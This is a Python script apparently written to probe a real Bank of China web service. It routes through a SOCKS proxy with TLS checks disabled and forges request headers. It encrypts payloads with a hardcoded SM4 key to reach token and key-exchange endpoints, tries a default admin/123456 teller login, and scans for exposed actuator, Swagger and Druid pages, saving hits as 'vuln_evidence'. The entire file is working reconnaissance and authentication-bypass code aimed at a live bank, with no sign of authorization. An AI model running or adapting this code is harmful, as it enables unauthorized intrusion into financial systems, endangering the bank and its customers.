#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import json
import time

proxies = {
    'http': 'socks5h://127.0.0.1:1080',
    'https': 'socks5h://127.0.0.1:1080',
}

url = "https://dl.brcloud.bankofchina.com/dlydjd/sgp/transferRequest"

headers = {
    "Content-Type": "application/json",
    "Authorization": "987654321",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://dl.brcloud.bankofchina.com",
    "Referer": "https://dl.brcloud.bankofchina.com/dlydjd/",
}

body = {
    "Header": {
        "CurrentPageNum": 1, "PageTotalNum": 10, "NoRetCode": True,
        "BranchId": "800000", "LegalRepCode": "10000", "TranTeller": "",
        "TranCode": "SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest",
        "TranDate": "20260716", "TranTime": "004500000",
        "ServiceName": "queryMenuTreeBySysIdRoleIdWithGuest",
        "ServiceCode": "D20190130",
        "AuthFlag": "0", "AuthrTellerNo": "1", "Channel": "39",
        "ConsumerId": "1", "GlobalSeq": "1", "GlobalSeqNo": "1",
        "KeyId": "1", "LocalLang": "1", "Mac": "1", "SourceSysId": "1111",
        "TerminalCode": "1121", "TranSeq": "1", "TranSeqNo": "1",
        "TranTellerNo": "1", "ExtendContent": "1", "TotalNum": "0"
    }
}

print("=== Test 1: Basic request with SOCKS proxy ===")
try:
    start = time.time()
    r = requests.post(url, headers=headers, json=body, proxies=proxies, 
                      verify=False, timeout=20)
    elapsed = round(time.time() - start, 2)
    print(f"Status: {r.status_code} | Time: {elapsed}s | Size: {len(r.text)}")
    if r.status_code == 200:
        try:
            data = r.json()
            ret_code = data.get("Header", {}).get("RetCode", "")
            ret_msg = data.get("Header", {}).get("RetMsg", "")
            print(f"RetCode: {ret_code} | RetMsg: {ret_msg}")
            if ret_code == "000000":
                print("SUCCESS! Saving response...")
                with open(r"e:\BaiduNetdiskDownload\1\vuln_evidence\socks_test_menu.json", 'w', encoding='utf-8') as f:
                    json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"Not JSON: {r.text[:300]}")
    else:
        print(f"Response: {r.text[:300]}")
except Exception as e:
    print(f"Error: {e}")

print("\n=== Test 2: isApiUseEncryptionList via SGP ===")
body2 = {
    "Header": {
        **body["Header"],
        "TranCode": "CUST-INFO/isApiUseEncryptionList",
        "ServiceName": "isApiUseEncryptionList",
    }
}
try:
    r = requests.post(url, headers=headers, json=body2, proxies=proxies,
                      verify=False, timeout=20)
    print(f"Status: {r.status_code} | Size: {len(r.text)}")
    try:
        data = r.json()
        print(json.dumps(data, ensure_ascii=False)[:500])
    except:
        print(r.text[:300])
except Exception as e:
    print(f"Error: {e}")

print("\n=== Test 3: gateway/admin/isApiUseEncryptionList (direct) ===")
url2 = "https://dl.brcloud.bankofchina.com/dlydjd/gateway/admin/isApiUseEncryptionList"
try:
    r = requests.post(url2, headers=headers, json=body2, proxies=proxies,
                      verify=False, timeout=20)
    print(f"Status: {r.status_code} | Size: {len(r.text)}")
    try:
        data = r.json()
        print(json.dumps(data, ensure_ascii=False)[:500])
    except:
        print(r.text[:300])
except Exception as e:
    print(f"Error: {e}")

print("\n=== Test 4: buildNonceToken (with SM4 encrypted data) ===")
from gmssl import sm4
import binascii
import random

K_E = "714b674e6c796245574d48652b39773d"

def sm4_encrypt(data_str, key_hex=K_E):
    key = binascii.unhexlify(key_hex)
    crypt = sm4.CryptSM4()
    crypt.set_key(key, sm4.SM4_ENCRYPT)
    return crypt.crypt_ecb(data_str.encode('utf-8')).hex()

num1 = 7 * random.randint(500, 999)
num2 = 13 * random.randint(500, 799)
plain = f"{num1}_{num2}"
enc = sm4_encrypt(plain)
print(f"Plain: {plain} | Encrypted: {enc}")

body3 = {
    "Header": {
        **body["Header"],
        "TranCode": "CUST-INFO/buildNonceToken",
        "ServiceName": "buildNonceToken",
    },
    "data": enc
}

# Try via SGP
try:
    r = requests.post(url, headers=headers, json=body3, proxies=proxies,
                      verify=False, timeout=20)
    print(f"[SGP buildNonceToken] Status: {r.status_code} | Size: {len(r.text)}")
    try:
        data = r.json()
        print(json.dumps(data, ensure_ascii=False)[:500])
    except:
        print(r.text[:300])
except Exception as e:
    print(f"Error: {e}")

# Try direct gateway
url3 = "https://dl.brcloud.bankofchina.com/dlydjd/gateway/admin/buildNonceToken"
try:
    r = requests.post(url3, headers=headers, json=body3, proxies=proxies,
                      verify=False, timeout=20)
    print(f"[GW buildNonceToken] Status: {r.status_code} | Size: {len(r.text)}")
    try:
        data = r.json()
        print(json.dumps(data, ensure_ascii=False)[:500])
    except:
        print(r.text[:300])
except Exception as e:
    print(f"Error: {e}")

print("\n=== Test 5: initUserKeyGroup (DH key exchange) ===")
mode_type = sm4_encrypt("modp1")
app_id = sm4_encrypt("sfs01003001303031")
nonce_val = f"s{int(time.time()*1000)}{random.randint(100000, 999999)}"
open_id = sm4_encrypt(nonce_val)
print(f"modeType(enc): {mode_type}")
print(f"appId(enc): {app_id}")
print(f"openId(enc): {open_id}")

body4 = {
    "Header": {
        **body["Header"],
        "TranCode": "CUST-INFO/initUserKeyGroup",
        "ServiceName": "initUserKeyGroup",
    },
    "negotiateValue": "",
    "modeType": mode_type,
    "appId": app_id,
    "openId": open_id
}

# Try via SGP
try:
    r = requests.post(url, headers=headers, json=body4, proxies=proxies,
                      verify=False, timeout=20)
    print(f"[SGP initUserKeyGroup] Status: {r.status_code} | Size: {len(r.text)}")
    try:
        data = r.json()
        print(json.dumps(data, ensure_ascii=False)[:500])
        if data.get("Header", {}).get("RetCode") == "000000":
            with open(r"e:\BaiduNetdiskDownload\1\vuln_evidence\socks_test_initkey.json", 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
    except:
        print(r.text[:300])
except Exception as e:
    print(f"Error: {e}")

# Try direct gateway
url4 = "https://dl.brcloud.bankofchina.com/dlydjd/gateway/admin/initUserKeyGroup"
try:
    r = requests.post(url4, headers=headers, json=body4, proxies=proxies,
                      verify=False, timeout=20)
    print(f"[GW initUserKeyGroup] Status: {r.status_code} | Size: {len(r.text)}")
    try:
        data = r.json()
        print(json.dumps(data, ensure_ascii=False)[:500])
    except:
        print(r.text[:300])
except Exception as e:
    print(f"Error: {e}")

print("\n=== Test 6: sgpTellerLogin.auth ===")
url5 = "https://dl.brcloud.bankofchina.com/dlydjd/sgp/sgpTellerLogin.auth"
body5 = {
    "Header": {
        **body["Header"],
        "TranCode": "test-Login",
        "ServiceName": "sgpTellerLogin",
    },
    "tellerId": "admin",
    "password": "123456"
}
try:
    r = requests.post(url5, headers=headers, json=body5, proxies=proxies,
                      verify=False, timeout=20)
    print(f"[sgpTellerLogin] Status: {r.status_code} | Size: {len(r.text)}")
    try:
        data = r.json()
        print(json.dumps(data, ensure_ascii=False)[:500])
    except:
        print(r.text[:300])
except Exception as e:
    print(f"Error: {e}")

print("\n=== Test 7: queryVerificationCode.auth ===")
url6 = "https://dl.brcloud.bankofchina.com/dlydjd/sgp/queryVerificationCode.auth"
body6 = {
    "Header": {
        **body["Header"],
        "TranCode": "test-queryVerificationCode",
        "ServiceName": "queryVerificationCode",
    }
}
try:
    r = requests.post(url6, headers=headers, json=body6, proxies=proxies,
                      verify=False, timeout=20)
    print(f"[queryVerificationCode] Status: {r.status_code} | Size: {len(r.text)}")
    try:
        data = r.json()
        print(json.dumps(data, ensure_ascii=False)[:500])
    except:
        print(r.text[:300])
except Exception as e:
    print(f"Error: {e}")

print("\n=== Test 8: Actuator endpoints ===")
for path in ["actuator/health", "actuator/env", "actuator/beans", "actuator/mappings",
             "swagger-ui.html", "v2/api-docs", "druid/index.html"]:
    try:
        r = requests.get(f"https://dl.brcloud.bankofchina.com/dlydjd/{path}", 
                         headers=headers, proxies=proxies, verify=False, timeout=10)
        if r.status_code != 404 and r.status_code != 403:
            print(f"[FOUND] /{path} => HTTP {r.status_code} | Size: {len(r.text)}")
            print(f"  {r.text[:200]}")
    except Exception as e:
        pass

print("\n=== All tests done ===")
